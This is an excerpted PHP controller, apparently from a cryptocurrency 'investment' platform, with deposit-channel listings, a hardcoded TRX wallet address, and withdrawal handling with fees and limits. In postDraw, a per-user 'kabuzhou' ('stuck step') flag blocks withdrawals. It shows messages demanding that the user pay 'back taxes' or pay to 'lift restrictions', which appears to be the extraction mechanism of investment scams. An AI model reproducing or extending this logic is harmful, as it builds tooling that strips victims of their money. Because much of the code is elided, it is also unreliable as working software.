...
class Invest extends Base
{
    public function lst()
    {
        $rate['trx'] = getConfig('usdt2trx', 0) ?? 1;
        $rate['bnb'] = getConfig('usdt2bnb', 0) ?? 1;
        $rate['eth'] = getConfig('usdt2eth', 0) ?? 1;
        $rate['pol'] = getConfig('usdt2pol', 0) ?? 1;
        // 获取所有可用的充值渠道
        $channels = [
            [
                'type' => 'trx',
                'name' => 'TRX',
                'icon' => '/static/images/trx.webp',
                'huobi' => 'TRX',
                'huilv' => $rate['trx'],
                'status' => 1
            ],
            [
                'type' => 'trx',
                'name' => 'TRX20-USDT',
                'icon' => '/static/images/trc20-usdt.jpg',
                'huobi' => 'TRX20-USDT',
                'huilv' => $rate['trx'],
                'status' => 1
            ],
            [
                'type' => 'bnb',
                'name' => 'BNB',
                'icon' => '/static/images/icon-bnb.webp',
                'huobi' => 'BNB',
                'huilv' => $rate['bnb'],
                'status' => 1
            ],
            [
                'type' => 'bnb',
                'name' => 'BEP20-USDT',
                'icon' => '/static/images/bep20-usdt.webp',
                'huobi' => 'BEP20-USDT',
                'huilv' => $rate['bnb'],
                'status' => 1
            ],
        ...
        // 获取多语言文本
        $ziduan = ['col_充值渠道', 'col_选择充值方式'];
        $col    = getcol($ziduan);

        ajaxReturn(1, '成功', ['text' => $col, 'data' => $channels]);
    }
    ...
    public function invest()
    {
        ...
        $type     = isset($postdata["type"]) ? $postdata["type"] : 'trx'; // 默认为trx类型

        $address = '';

        if ($type == 'bnb' || $type == 'eth' || $type == 'pol') {
            // BNB逻辑
        ...
        $data = ['qianbao' => $address, 'huilv' => $huilv, 'huobi' => $huobi, 'type' => $type];
    ...
    public function postInvest()
    {
        ...
        if (empty($haveExit)) {
            if (in_array($type, ['bnb', 'eth', 'pol'])) {
                $taskType = 'recharge_eth';
                $symbol = strtoupper($type);
            } else {
                $symbol = 'TRX';
                $taskType = 'chongzhi';
            }
    ...
    {
        $qianbao    = 'TKf4aEj5pJzEJWrCSwkdzSsYmnHzJbtibM';
        $ziduan     = ['col_佣金账户', 'col_24小时提款', 'col_可提款', 'col_提款手续费', 'col_使用次数', 'col_手续费', 'col_限额', 'col_torn地址', 'col_bep20地址', 'col_安全密码', 'col_次', 'col_出款方式'];
        $col        = getcol($ziduan);
        ...
        // 获取TRX和BNB的汇率
        $huilv_trx = getConfig('usdt2trx', 0);
        $huilv_bnb = getConfig('usdt2bnb', 0);

        if (ZHB == 'USDT') {
            $keti_TRX = bcmul($huilv_trx, $commission_balance, 6);
            $keti_BNB = bcmul($huilv_bnb, $commission_balance, 6);
            $keti_USDT = $commission_balance;
        } else {
            $keti_TRX  = $commission_balance;
            $keti_BNB  = $commission_balance;
            $keti_USDT = bcdiv($commission_balance, $huilv_trx, 6);
        }

        // TRX提现费率和免费次数
        $tixian_rate        = getConfig('tixian_rate', 0);
        $tixian_day_mianfei = getConfig('tixian_day_mianfei', 0);
        $tixiancishu = Db::name('draw_order')->where([
            'add_time'  => ['LIKE', '%' . date('Y-m-d') . '%'],
            'user_id'   => $this->userInfo['id'],
            'huobi'     => ['in', ['TRX20-USDT', 'TRX']]
        ])->count();

        // BNB提现费率和免费次数
        $tx_bnb_rate = getConfig('tx_bnb_rate', 0);
        $tx_free_bnb = getConfig('tx_free_bnb', 0);
        $bnb_tixiancishu = Db::name('draw_order')->where([
            'add_time'  => ['LIKE', '%' . date('Y-m-d') . '%'],
            'user_id'   => $this->userInfo['id'],
            'huobi'     => ['in', ['BEP20-USDT', 'BNB', 'BEP20-USDC', 'ETH', 'ERC20-USDT', 'ERC20-USDC', 'POL', 'POL-USDT', 'POL-USDC']]
        ])->count();
        ...
        if ($bnb_tixiancishu >= $tx_free_bnb) {
            $bnb_tixiancishu = $tx_free_bnb;
        } else {
            $tx_bnb_rate = 0;
        }

        $tiian_count_info     = $tixiancishu . '/' . $tixian_day_mianfei;
        $bnb_tiian_count_info = $bnb_tixiancishu . '/' . $tx_free_bnb;
        ...
        $data = [
            ...
            'keti_TRX'          => $keti_TRX,
            'keti_BNB'          => $keti_BNB,
            'tixian_rate'       => $tixian_rate,
            'tx_bnb_rate'       => $tx_bnb_rate,
            'tiian_count_info'  => $tiian_count_info,
            'bnb_tiian_count_info' => $bnb_tiian_count_info,
            'huilv_trx'         => $huilv_trx,
            'huilv_bnb'         => $huilv_bnb,
            'xiane'             => $xiane
        ];
    ...
    public function postDraw()
    {
        ...
        $ethSymbol = ['ETH', 'ERC20-USDT', 'ERC20-USDC', 'POL', 'POL-USDT', 'POL-USDC', 'BEP20-USDT', 'BNB', 'BEP20-USDC'];
        ...
        if ($this->userInfo['kabuzhou'] == 2) {
            ...
            echo json_encode([
                'code' => 0,
                'msg'  => lang('ajax_你需要补税', [$bushui, ZHB]),
                'data' => []
        ...
        if ($this->userInfo['kabuzhou'] == 3 && $money != 5) {
            ...
            echo json_encode([
                'code' => 0,
                'msg'  => lang('ajax_你需要解除限制', [$buchong2, ZHB]),
                'data' => []
            ], JSON_UNESCAPED_UNICODE);
            exit();
        }
        ...
        // 根据货币类型选择不同的验证方式
        if (in_array($huobi, ['TRX20-USDT', 'TRX'])) {
            // TRX 地址验证
        ...
        } elseif (in_array($huobi, $ethSymbol)) {
            // 如果验证过程中出现任何错误，仅进行基本格式验证
            if (!preg_match('/^0x[a-fA-F0-9]{40}$/', $to_address)) {
                ajaxReturn(0, 'col_提款地址不正确');
            }
        }

        $drawshemian  = Db::name('drawshemian')
        ...
        if (!empty($drawshemian)) {
            $histortwhere = [
                'user_id'   => $this->userInfo['id'],
                'status'    => 2,
                'add_time'  => ['gt', $drawshemian['add_time']]
            ];
        }
        ...
        $withdrawSymbol = array_merge($ethSymbol, ['TRX', 'TRX20-USDT']);
        // 更新支持的提款方式
        if (!in_array($huobi, $withdrawSymbol)) {
            feifaReturn(1);
        }
        ...
        if (in_array($huobi, $ethSymbol)) {
            $zuihou_value = calculateCurrencyValue($money, $huobi);
        } else {
        ...
        if ($zuihou_value < $zuiditikuan) {
            echo json_encode([
                'code' => 0,
                'msg' => lang('ajax_最低提款', [$zuiditikuan, ZHB]),
                'data' => []
            ], JSON_UNESCAPED_UNICODE);
            exit();
        }
        ...
        // 根据货币类型选择不同的费率和免费次数配置
        $tixian_rate        = 0;
        $tixian_day_mianfei = 0;
        $tixiancishu        = 0;
        ...
        if (in_array($huobi, ['TRX20-USDT', 'TRX'])) {
            ...
            $tixian_rate        = getConfig('tx_bnb_rate', 0);
            $tixian_day_mianfei = getConfig('tx_free_bnb', 0);
        ...
        // 获取每日提款次数限制
        $tixian_day_num = in_array($huobi, ['TRX20-USDT', 'TRX']) ? getConfig('tixian_day_num', 0) : getConfig('tx_day_bnb', 0);
        ...
        $zuihou_daozhang    = calculateCurrencyValue($daozhang, $huobi);
        $zuihou_shouxvfei   = calculateCurrencyValue($zuihou_shouxvfei, $huobi);
        ...
        if (in_array($huobi, ['TRX20-USDT', 'TRX'])) {
            $huilv = getConfig('usdt2trx', 0);
        } elseif (in_array($huobi, ['ETH', 'ERC20-USDT', 'ERC20-USDC'])) {
            $huilv = getConfig('usdt2eth', 0) ?? 1;
        } elseif (in_array($huobi, ['POL', 'POL-USDT', 'POL-USDC'])) {
            $huilv = getConfig('usdt2pol', 0) ?? 1;
        } else {
            $huilv = getConfig('usdt2bnb', 0) ?? 1;
        }
        ...
        $insertdata = [
            ...
            'huobi'         => $huobi,
            'huilv_now'     => $huilv,
            'zhuanzhang_type'   => $zhuanzhang_type,
            'shouxvfei_rate'    => $tixian_rate,
            'shouxvfei'         => $shouxvfei,
            'zuihou_shouxvfei'  => $zuihou_shouxvfei,
            'daozhang'          => $daozhang,
            'zuihou_daozhang'   => $zuihou_daozhang,
            'user_id'           => $this->userInfo['id'],
            'money'             => $money,
            'add_time'          => date('Y-m-d H:i:s'),
            'zuihou_value'      => $zuihou_value
        ];
    ...
    public function caiwuJilu()
    {
        ...
        $list = Db::name($table)
            ->where($where)
            ->field('before,add_time,aftre,change,type')
            ->order('add_time desc')
            ->paginate(10);
